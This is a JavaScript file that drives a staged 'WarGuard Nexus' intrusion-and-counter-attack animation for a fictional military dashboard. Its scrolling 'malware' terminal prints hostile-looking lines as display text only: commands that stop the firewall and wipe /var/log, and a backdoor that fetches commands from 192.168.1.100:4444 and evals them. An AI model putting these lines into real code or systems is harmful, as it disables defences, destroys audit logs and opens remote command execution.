document.addEventListener('DOMContentLoaded', () => {
    // Elements
    const militaryDashboard = document.getElementById('military-dashboard');
    const intrusionAlert = document.getElementById('intrusion-alert');
    const malwareTerminal = document.getElementById('malware-terminal');
    const defenseSystem = document.getElementById('defense-system');
    const aiInterface = document.getElementById('ai-interface');
    const commandTerminal = document.getElementById('command-terminal');
    const counterAttack = document.getElementById('counter-attack');
    const systemLockdown = document.getElementById('system-lockdown');
    const skipIntroButton = document.getElementById('skip-intro-button');
    
    // Audio elements
    const ambientSound = document.getElementById('ambient-sound');
    const alarmSound = document.getElementById('alarm-sound');
    const keyboardSound = document.getElementById('keyboard-sound');
    const successSound = document.getElementById('success-sound');
    
    // DOM elements for dynamic content
    const timestampElement = document.getElementById('timestamp');
    const systemLogs = document.getElementById('system-logs');
    const statusValue = document.querySelector('.status-value');
    const malwareContent = document.getElementById('malware-content');
    const defenseProgress = document.getElementById('defense-progress');
    const defenseMessage = document.getElementById('defense-message');
    const aiLog = document.getElementById('ai-log');
    const interceptionProgress = document.getElementById('interception-progress');
    const interceptionPercentage = document.getElementById('interception-percentage');
    const terminalOutput = document.getElementById('terminal-output');
    const commandInput = document.getElementById('command-input');
    const cursor = document.getElementById('cursor');
    const counterMessage = document.getElementById('counter-message');
    const counterProgress = document.getElementById('counter-progress');
    const counterProgressLabel = document.getElementById('counter-progress-label');
    const lockdownProgress = document.getElementById('lockdown-progress');
    const mapNodes = document.querySelectorAll('.map-node');
    
    // Global variables
    let inputBuffer = '';
    let typingInterval;
    let simulationStarted = false;
    let simulationSkipped = false;
    
    // Helper function to update progress bar
    const updateProgressBar = (progressBar, percentage) => {
        progressBar.style.setProperty('--progress', `${percentage}%`);
        progressBar.style.width = `${percentage}%`;
    };
    
    // Helper function to create typewriter effect
    const typeText = (element, text, speed = 50) => {
        let i = 0;
        element.textContent = '';
        return new Promise(resolve => {
            const typing = setInterval(() => {
                if (i < text.length) {
                    element.textContent += text.charAt(i);
                    i++;
                } else {
                    clearInterval(typing);
                    resolve();
                }
            }, speed);
        });
    };
    
    // Helper function to add log entry with typewriter effect
    const addLogEntry = (container, text) => {
        const logItem = document.createElement('div');
        logItem.className = 'log-entry';
        container.appendChild(logItem);
        return typeText(logItem, text);
    };
    
    // Helper function to update timestamp
    const updateTimestamp = () => {
        const now = new Date();
        const hours = String(now.getUTCHours()).padStart(2, '0');
        const minutes = String(now.getUTCMinutes()).padStart(2, '0');
        const seconds = String(now.getUTCSeconds()).padStart(2, '0');
        timestampElement.textContent = `${hours}:${minutes}:${seconds} UTC`;
    };
    
    // Initialize timestamp and update every second
    updateTimestamp();
    setInterval(updateTimestamp, 1000);
    
    // Generate malware code for terminal
    const generateMalwareCode = () => {
        const codeLines = [
            "#!/bin/bash",
            "# Malicious code execution",
            "function bypass_security() {",
            "   echo 'Bypassing security protocols...'",
            "   for i in {1..100}; do",
            "       sleep 0.01",
            "       echo $i > /dev/null",
            "   done",
            "   return 0",
            "}",
            "",
            "// Injecting payload...",
            "class MalwareInjector {",
            "   constructor() {",
            "       this.payload = 'UEsDBBQACAgIAJh7JVEAAAAAAAAAAAAAAAAJAAAAaW5kZXgucGhw7VfRctowFH3nK1'",
            "       this.target = '/sys/kernel/security'",
            "       this.decryptKey = 'c944e5bfddaf89fa14d848dfa8e9eb93e7741f4e'",
            "   }",
            "",
            "   deploy() {",
            "       console.log('Deploying malware package...')",
            "       // Bypass security checks",
            "       this.bypassFirewall()",
            "       this.injectPayload()",
            "       this.establishPersistence()",
            "       return true",
            "   }",
            "}",
            "",
            "function encrypt(data, key) {",
            "   let result = []",
            "   for(let i = 0; i < data.length; i++) {",
            "       result.push(String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length)))",
            "   }",
            "   return result.join('')",
            "}",
            "",
            "// Main execution",
            "const injector = new MalwareInjector()",
            "injector.deploy()",
            "console.log('Malware deployed successfully')",
            "",
            "# Disabling security systems",
            "systemctl stop firewalld",
            "systemctl disable firewalld",
            "rm -rf /var/log/*",
            "",
            "/* Creating backdoor access */",
            "const backdoor = {",
            "   port: 4444,",
            "   protocol: 'tcp',",
            "   callback: '192.168.1.100',",
            "   interval: 10000,",
            "   execute: function() {",
            "       setInterval(() => {",
            "           fetch(`http://${this.callback}:${this.port}/ping`)",
            "               .then(res => res.json())",
            "               .then(data => eval(data.command))",
            "       }, this.interval)",
            "   }",
            "}",
            "",
            "backdoor.execute()",
            "// End of malware initialization"
        ];
        
        let terminalContent = '';
        let lineIndex = 0;
        
        const addCodeLine = () => {
            if (lineIndex < codeLines.length) {
                terminalContent += codeLines[lineIndex] + '\n';
                malwareContent.textContent = terminalContent;
                malwareContent.scrollTop = malwareContent.scrollHeight;
                lineIndex++;
                setTimeout(addCodeLine, Math.random() * 100 + 30);
            }
        };
        
        addCodeLine();
    };
    
    // Handle user input in command terminal
    const setupCommandTerminal = () => {
        document.addEventListener('keydown', (e) => {
            if (!commandTerminal.classList.contains('active')) return;
            
            // Handle backspace
            if (e.key === 'Backspace') {
                if (inputBuffer.length > 0) {
                    inputBuffer = inputBuffer.slice(0, -1);
                    commandInput.textContent = inputBuffer;
                }
                e.preventDefault();
                return;
            }
            
            // Handle Enter key
            if (e.key === 'Enter') {
                if (inputBuffer.toLowerCase() === 'btf') {
                    terminalOutput.innerHTML += `<div>> ${inputBuffer}</div>`;
                    terminalOutput.innerHTML += '<div>Authorization accepted</div>';
                    inputBuffer = '';
                    commandInput.textContent = '';
                    commandTerminal.classList.remove('active');
                    startCounterAttackSequence();
                } else if (inputBuffer.trim() !== '') {
                    terminalOutput.innerHTML += `<div>> ${inputBuffer}</div>`;
                    terminalOutput.innerHTML += '<div>Authorization denied. Try again.</div>';
                    inputBuffer = '';
                    commandInput.textContent = '';
                }
                e.preventDefault();
                return;
            }
            
            // Regular keystroke (only alphanumeric and some special chars)
            if (e.key.length === 1 && /^[a-zA-Z0-9!@#$%^&*()_\-+=[\]{}|;:',.<>/?\\]$/.test(e.key)) {
                keyboardSound.currentTime = 0;
                keyboardSound.play();
                inputBuffer += e.key;
                commandInput.textContent = inputBuffer;
                e.preventDefault();
            }
        });
    };
    
    // Start the simulation sequence
    const startSimulation = () => {
        if (simulationStarted) return;
        simulationStarted = true;
        console.log('Starting simulation sequence...');
        
        // Start ambient sound
        ambientSound.volume = 0.3;
        ambientSound.play();
        
        // Show Skip Intro button after 5 seconds
        setTimeout(() => {
            skipIntroButton.style.display = 'block';
            setTimeout(() => {
                skipIntroButton.style.opacity = '1';
            }, 100);
        }, 5000);
        
        // Phase 1: Initial Military Interface (0-2 seconds)
        militaryDashboard.classList.add('active');
        
        // Add initial log entries
        setTimeout(() => addLogEntry(systemLogs, '[00:00:03] <span class="log-type info">INFO</span> Perimeter scan complete - No threats detected'), 500);
        setTimeout(() => addLogEntry(systemLogs, '[00:00:04] <span class="log-type success">SUCCESS</span> Encryption protocols verified'), 1000);
        setTimeout(() => addLogEntry(systemLogs, '[00:00:05] <span class="log-type info">INFO</span> Satellite uplink established'), 1500);
        
        // Add log entry with prompt to press Enter
        setTimeout(() => {
            addLogEntry(systemLogs, '[00:00:06] <span class="log-type warning">ALERT</span> Anomaly detected. Press ENTER to start the intrusion');
            
            // Add Press Enter message in the center of screen
            const enterPrompt = document.createElement('div');
            enterPrompt.id = 'enter-prompt';
            enterPrompt.innerHTML = 'Press <span class="key">ENTER</span> to start the intrusion';
            enterPrompt.style.position = 'fixed';
            enterPrompt.style.top = '50%';
            enterPrompt.style.left = '50%';
            enterPrompt.style.transform = 'translate(-50%, -50%)';
            enterPrompt.style.padding = '15px 30px';
            enterPrompt.style.background = 'rgba(255, 214, 0, 0.15)';
            enterPrompt.style.border = '1px solid var(--warning-yellow)';
            enterPrompt.style.color = 'var(--warning-yellow)';
            enterPrompt.style.fontFamily = '"Share Tech Mono", monospace';
            enterPrompt.style.fontSize = '18px';
            enterPrompt.style.zIndex = '1000';
            enterPrompt.style.borderRadius = '4px';
            enterPrompt.style.boxShadow = '0 0 15px rgba(255, 214, 0, 0.3)';
            enterPrompt.style.textAlign = 'center';
            document.body.appendChild(enterPrompt);
            
            // Create key style
            const keySpan = enterPrompt.querySelector('.key');
            if (keySpan) {
                keySpan.style.padding = '2px 8px';
                keySpan.style.background = 'rgba(255, 214, 0, 0.2)';
                keySpan.style.border = '1px solid var(--warning-yellow-dark)';
                keySpan.style.borderRadius = '3px';
                keySpan.style.fontWeight = 'bold';
                keySpan.style.marginLeft = '5px';
                keySpan.style.marginRight = '5px';
            }
            
            // Blinking animation
            let visible = true;
            const blinkInterval = setInterval(() => {
                visible = !visible;
                enterPrompt.style.opacity = visible ? '1' : '0.5';
            }, 800);
            
            // Add event listener for Enter key to start the attack sequence
            const startAttackSequence = (e) => {
                if (e.key === 'Enter') {
                    // Remove event listener
                    document.removeEventListener('keydown', startAttackSequence);
                    
                    // Remove enter prompt
                    clearInterval(blinkInterval);
                    document.body.removeChild(enterPrompt);
                    
                    // Play keyboard sound effect
                    keyboardSound.currentTime = 0;
                    keyboardSound.play();
                    
                    // Add log entry confirming analysis
                    addLogEntry(systemLogs, '[00:00:07] <span class="log-type danger">DANGER</span> Initiating threat analysis...');
                    
                    // Start the attack sequence after a brief delay
                    setTimeout(() => {
                        triggerAttackSequence();
                    }, 1000);
                }
            };
            
            document.addEventListener('keydown', startAttackSequence);
        }, 2000);
    };
    
    // Function to trigger the attack sequence when Enter is pressed
    const triggerAttackSequence = () => {
        if (simulationSkipped) return;
        
        // Visual effects for attack - multiple flickers for more impact
        const flickerSequence = () => {
            document.body.classList.add('flicker');
            setTimeout(() => {
                document.body.classList.remove('flicker');
                setTimeout(() => {
                    document.body.classList.add('flicker');
                    setTimeout(() => {
                        document.body.classList.remove('flicker');
                        setTimeout(() => {
                            document.body.classList.add('flicker');
                            setTimeout(() => document.body.classList.remove('flicker'), 100);
                        }, 100);
                    }, 100);
                }, 100);
            }, 100);
        };
        
        flickerSequence();
        
        // Show intrusion alert with red warning
        intrusionAlert.classList.add('active');
        
        // Play alarm sound
        alarmSound.volume = 0.2;
        alarmSound.play();
        
        // Update status indicator
        const statusBadge = document.querySelector('.status-badge.secure');
        if (statusBadge) {
            statusBadge.classList.remove('secure');
            statusBadge.classList.add('compromised');
            statusBadge.innerHTML = '<i class="fas fa-exclamation-triangle"></i><span>COMPROMISED</span>';
        }
        
        // Change node status - make CHARLIE node compromised
        const charlieNode = mapNodes[2]; // CHARLIE node
        if (charlieNode) {
            charlieNode.classList.remove('secure');
            charlieNode.classList.add('compromised');
            charlieNode.classList.add('attacked-node');
        }
        
        // Add visual attack effects to map lines
        const mapLines = document.querySelectorAll('.map-line');
        if (mapLines.length > 1) {
            mapLines[1].style.background = 'linear-gradient(to right, var(--danger-red), rgba(255, 61, 61, 0.1))';
        }
        if (mapLines.length > 2) {
            mapLines[2].style.background = 'linear-gradient(to right, var(--danger-red), rgba(255, 61, 61, 0.1))';
        }
        
        // Create attack traces on the map - define the function
        const createAttackTrace = (startX, startY, endX, endY) => {
            const trace = document.createElement('div');
            trace.className = 'attack-trace';
            trace.style.position = 'absolute';
            trace.style.height = '2px';
            trace.style.background = 'linear-gradient(to right, var(--danger-red), rgba(255, 61, 61, 0.1))';
            trace.style.opacity = '0.8';
            trace.style.zIndex = '5';
            
            const dx = endX - startX;
            const dy = endY - startY;
            const angle = Math.atan2(dy, dx) * 180 / Math.PI;
            const length = Math.sqrt(dx * dx + dy * dy);
            
            trace.style.top = `${startY}%`;
            trace.style.left = `${startX}%`;
            trace.style.width = `${length}%`;
            trace.style.transformOrigin = 'left center';
            trace.style.transform = `rotate(${angle}deg)`;
            trace.style.animation = 'attack-trace-pulse 0.8s infinite alternate';
            
            document.querySelector('.map').appendChild(trace);
        };
        
        // Create attack traces connecting to CHARLIE node
        setTimeout(() => {
            createAttackTrace(80, 40, 50, 25); // From ECHO to CHARLIE
            createAttackTrace(35, 45, 50, 25); // From BRAVO to CHARLIE
        }, 300);
        
        // Show malware terminal with scrolling code
        setTimeout(() => {
            malwareTerminal.classList.add('active');
            generateMalwareCode();
            
            // Add detailed log entries about the attack
            addLogEntry(systemLogs, '[00:00:06] <span class="log-type error">CRITICAL</span> SECURITY BREACH DETECTED');
            addLogEntry(systemLogs, '[00:00:06] <span class="log-type error">ALERT</span> Unauthorized access in sector CHARLIE');
            addLogEntry(systemLogs, '[00:00:07] <span class="log-type error">ALERT</span> Malicious code execution in progress');
            
            // Update the security level in the footer
            const securityValue = document.querySelector('.security-value');
            if (securityValue) {
                securityValue.classList.remove('secure');
                securityValue.classList.add('danger');
                securityValue.textContent = 'CRITICAL';
            }
        }, 500);
        
        // Phase 3: AI Defense System Boot (exactly at 6-second mark)
        setTimeout(() => {
            if (simulationSkipped) return;
            
            // Hide previous elements
            intrusionAlert.classList.remove('active');
            
            // Show defense system
            defenseSystem.classList.add('active');
            
            // Update defense progress bar over 1 second
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 2;
                updateProgressBar(defenseProgress, progress);
                if (progress >= 100) {
                    clearInterval(progressInterval);
                }
            }, 20); // 50 steps in 1 second = 20ms per step
            
            // Display message with typewriter effect
            setTimeout(() => {
                typeText(defenseMessage, 'Analyzing threat signature...', 30);
            }, 1000);
        }, 6000);
        
        // Phase 4: AI Interception Phase (8 seconds onward)
        setTimeout(() => {
            if (simulationSkipped) return;
            
            // Hide previous elements
            defenseSystem.classList.remove('active');
            
            // Show AI interface
            aiInterface.classList.add('active');
            
            // Log entries with precise timing
            setTimeout(() => addLogEntry(aiLog, '> Isolating malicious code'), 500); // 8.5s
            setTimeout(() => addLogEntry(aiLog, '> Creating deception environment'), 1500); // 9.5s
            setTimeout(() => addLogEntry(aiLog, '> Analyzing attack vector'), 2500); // 10.5s
            setTimeout(() => addLogEntry(aiLog, '> Preparing countermeasures'), 3500); // 11.5s
            
            // Update interception progress over 5 seconds
            let interceptProgress = 0;
            const interceptInterval = setInterval(() => {
                interceptProgress += 0.5;
                updateProgressBar(interceptionProgress, interceptProgress);
                interceptionPercentage.textContent = `${Math.round(interceptProgress)}%`;
                if (interceptProgress >= 100) {
                    clearInterval(interceptInterval);
                }
            }, 25); // 200 steps in 5 seconds = 25ms per step
            
        }, 8000);
        
        // Phase 5: Command Terminal Activation (13 seconds)
        setTimeout(() => {
            if (simulationSkipped) return;
            
            // Show command terminal
            commandTerminal.classList.add('active');
            
            // Add initial instruction
            terminalOutput.innerHTML += '<div>Enter authorization code to deploy counter-measure:</div>';
            
            // Setup keyboard input capture
            setupCommandTerminal();
            
        }, 13000);
    };
    
    // Counter-Attack Sequence
    const startCounterAttackSequence = () => {
        // Hide previous elements
        aiInterface.classList.remove('active');
        
        // Show counter attack interface
        counterAttack.classList.add('active');
        
        // Display message
        typeText(counterMessage, 'Reversing attack vector');
        
        // Animate trace route
        setTimeout(() => {
            document.querySelector('.trace-path').style.width = '80%';
        }, 1000);
        
        // Progress bar for virus preparation (3 seconds)
        setTimeout(() => {
            let prepProgress = 0;
            const prepInterval = setInterval(() => {
                prepProgress += 1;
                updateProgressBar(counterProgress, prepProgress);
                if (prepProgress >= 100) {
                    clearInterval(prepInterval);
                    
                    // Change to deployment phase
                    counterProgressLabel.textContent = 'DEPLOYING NO-ESCAPE VIRUS PACKAGE';
                    
                    // Progress bar for deployment (4 seconds)
                    let deployProgress = 0;
                    updateProgressBar(counterProgress, 0);
                    
                    const deployInterval = setInterval(() => {
                        deployProgress += 0.5;
                        updateProgressBar(counterProgress, deployProgress);
                        if (deployProgress >= 100) {
                            clearInterval(deployInterval);
                            
                            // Show success message
                            successSound.play();
                            counterMessage.innerHTML = '<span class="success-message">Counter-injection successful</span>';
                            
                            // Start lockdown phase after 2 seconds
                            setTimeout(startSystemLockdown, 2000);
                        }
                    }, 20); // 200 steps in 4 seconds = 20ms per step
                }
            }, 30); // 100 steps in 3 seconds = 30ms per step
        }, 2000);
    };
    
    // System Lockdown Phase
    const startSystemLockdown = () => {
        // Hide previous elements
        counterAttack.classList.remove('active');
        
        // Show system lockdown interface
        systemLockdown.classList.add('active');
        
        // System hardening process (3 seconds)
        let lockdownProgressValue = 0;
        const lockdownInterval = setInterval(() => {
            lockdownProgressValue += 1;
            updateProgressBar(lockdownProgress, lockdownProgressValue);
            if (lockdownProgressValue >= 100) {
                clearInterval(lockdownInterval);
                
                // Show authentication interface
                document.querySelector('.auth-container').style.display = 'block';
                
                // Set up authentication input
                const authInput = document.getElementById('auth-input');
                authInput.focus();
                
                authInput.addEventListener('keydown', (e) => {
                    if (e.key === 'Enter') {
                        document.querySelector('.auth-message').textContent = 'Authentication successful. System secured.';
                        authInput.disabled = true;
                        
                        // Reset map nodes to secure status
                        mapNodes.forEach(node => {
                            node.classList.remove('compromised', 'attacked-node');
                            node.classList.add('secure');
                        });
                        
                        // Change system status back to secure
                        statusValue.classList.remove('compromised');
                        statusValue.classList.add('secure');
                        statusValue.textContent = 'SECURE';
                        
                        // Final message
                        setTimeout(() => {
                            const finalMessage = document.createElement('div');
                            finalMessage.className = 'final-message';
                            finalMessage.textContent = 'WarGuard Nexus Defense System has successfully mitigated the threat.';
                            finalMessage.style.position = 'absolute';
                            finalMessage.style.top = '20px';
                            finalMessage.style.left = '0';
                            finalMessage.style.width = '100%';
                            finalMessage.style.textAlign = 'center';
                            finalMessage.style.color = 'var(--secure-green)';
                            finalMessage.style.fontSize = '24px';
                            finalMessage.style.fontWeight = 'bold';
                            document.body.appendChild(finalMessage);
                        }, 1000);
                    }
                });
            }
        }, 30); // 100 steps in 3 seconds = 30ms per step
    };
    
    // Skip intro button functionality
    skipIntroButton.addEventListener('click', () => {
        simulationSkipped = true;
        
        // Hide all elements
        document.querySelectorAll('.interface-container, .alert-container, .terminal-container, .defense-container, .ai-container, .command-container, .counter-container, .lockdown-container').forEach(el => {
            el.classList.remove('active');
        });
        
        // Stop any audio
        ambientSound.pause();
        alarmSound.pause();
        
        // Show command terminal directly
        commandTerminal.classList.add('active');
        
        // Add initial instruction
        terminalOutput.innerHTML = '<div>Simulation skipped.</div>';
        terminalOutput.innerHTML += '<div>Enter authorization code to deploy counter-measure:</div>';
        
        // Setup keyboard input capture
        setupCommandTerminal();
        
        // Hide skip button
        skipIntroButton.style.display = 'none';
    });
    
    // Auto-start in fullscreen mode
    const launchFullscreen = (element) => {
        if(element.requestFullscreen) {
            element.requestFullscreen();
        } else if(element.mozRequestFullScreen) {
            element.mozRequestFullScreen();
        } else if(element.webkitRequestFullscreen) {
            element.webkitRequestFullscreen();
        } else if(element.msRequestFullscreen) {
            element.msRequestFullscreen();
        }
    };
    
    // Auto-start function
    const autoStart = () => {
        launchFullscreen(document.documentElement);
        startSimulation();
    };
    
    // Start the simulation automatically
    autoStart();
    
    // Add ESC key handler for fullscreen exit
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && document.fullscreenElement) {
            if (document.exitFullscreen) {
                document.exitFullscreen();
            } else if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            } else if (document.mozCancelFullScreen) {
                document.mozCancelFullScreen();
            } else if (document.msExitFullscreen) {
                document.msExitFullscreen();
            }
        }
    });
});
